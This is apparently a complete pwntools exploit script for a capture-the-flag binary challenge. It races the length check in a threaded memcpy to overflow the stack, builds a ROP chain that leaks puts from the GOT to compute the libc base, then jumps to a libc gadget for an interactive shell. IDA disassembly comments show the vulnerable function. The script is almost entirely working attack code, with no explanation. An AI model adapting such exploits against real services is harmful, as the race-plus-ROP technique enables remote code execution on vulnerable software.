from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "debug"

io=remote("nc1.ctfplus.cn", 11459)
libc=ELF('./libc.so.6')

pop_rdi = 0x4012a3
global_msg_interior = 0x4040d0 # or global_msg start (0x4040c0)
got_puts = 0x404018
plt_puts = 0x4010c0
main = 0x401492
# .text:00000000004012D8 ; =============== S U B R O U T I N E =======================================
# .text:00000000004012D8
# .text:00000000004012D8 ; Attributes: bp-based frame
# .text:00000000004012D8
# .text:00000000004012D8 ; void *async_copy(void *)
# .text:00000000004012D8                 public async_copy
# .text:00000000004012D8 async_copy      proc near               ; DATA XREF: main+114↓o
# .text:00000000004012D8
# .text:00000000004012D8 var_28          = qword ptr -28h
# .text:00000000004012D8 dest            = byte ptr -20h
# .text:00000000004012D8
# .text:00000000004012D8 ; __unwind {
# .text:00000000004012D8                 endbr64
# .text:00000000004012DC                 push    rbp
# .text:00000000004012DD                 mov     rbp, rsp
# .text:00000000004012E0                 sub     rsp, 30h
# .text:00000000004012E4                 mov     [rbp+var_28], rdi
# .text:00000000004012E8                 mov     eax, cs:copy_length
# .text:00000000004012EE                 cmp     eax, 20h ; ' '
# .text:00000000004012F1                 jg      short loc_40133C
# .text:00000000004012F3                 lea     rax, s          ; "[Thread] Length check passed! Preparing"...
# .text:00000000004012FA                 mov     rdi, rax        ; s
# .text:00000000004012FD                 call    _puts
# .text:0000000000401302                 mov     edi, 7A120h     ; useconds
# .text:0000000000401307                 call    _usleep
# .text:000000000040130C                 mov     eax, cs:copy_length
# .text:0000000000401312                 movsxd  rdx, eax        ; n
# .text:0000000000401315                 lea     rax, [rbp+dest]
# .text:0000000000401319                 lea     rcx, global_msg
# .text:0000000000401320                 mov     rsi, rcx        ; src
# .text:0000000000401323                 mov     rdi, rax        ; dest
# .text:0000000000401326                 call    _memcpy
# .text:000000000040132B                 lea     rax, aThreadCopyDone ; "[Thread] Copy done! Exiting thread..."
# .text:0000000000401332                 mov     rdi, rax        ; s
# .text:0000000000401335                 call    _puts
# .text:000000000040133A                 jmp     short loc_40134B
# .text:000000000040133C ; ---------------------------------------------------------------------------
# .text:000000000040133C
# .text:000000000040133C loc_40133C:                             ; CODE XREF: async_copy+19↑j
# .text:000000000040133C                 lea     rax, aThreadErrorLen ; "[Thread] Error: Length too large! Abort"...
# .text:0000000000401343                 mov     rdi, rax        ; s
# .text:0000000000401346                 call    _puts
# .text:000000000040134B
# .text:000000000040134B loc_40134B:                             ; CODE XREF: async_copy+62↑j
# .text:000000000040134B                 mov     eax, 0
# .text:0000000000401350                 leave
lea_rax_s = 0x4012f3

io.sendlineafter(b"Choice: ", b"1")
io.send(flat(
    b'A' * 32,

    global_msg_interior,

    pop_rdi, got_puts,
    plt_puts,

    main,

    lea_rax_s
))

io.sendlineafter(b"Choice: ",b"2")
io.sendlineafter(b"Length: ",b'1')

io.sendlineafter(b"Choice: ",b"3")

io.sendline(b"2")
io.recvuntil(b"[Thread] Length check passed! Preparing to copy...")
io.sendline(b"512")

io.recvuntil(b"[Thread] Copy done! Exiting thread...\n")
libc_base=u64(io.recv(6)+b"\x00\x00") - libc.sym.puts
pop_rax_offset = 0x0000000000045eb0
pop_rbp_offset = 0x000000000002a2e0
binsh_offset = 0xebd43

io.sendline(b"1")
io.recvuntil(b"[Thread] Length check passed! Preparing to copy...")
io.send(
    p64(main) * 8 + 
    p64(libc_base + pop_rax_offset) + p64(0) +
    p64(libc_base + pop_rbp_offset) + p64(0x404800) +
    p64(libc_base + binsh_offset)
)

io.interactive()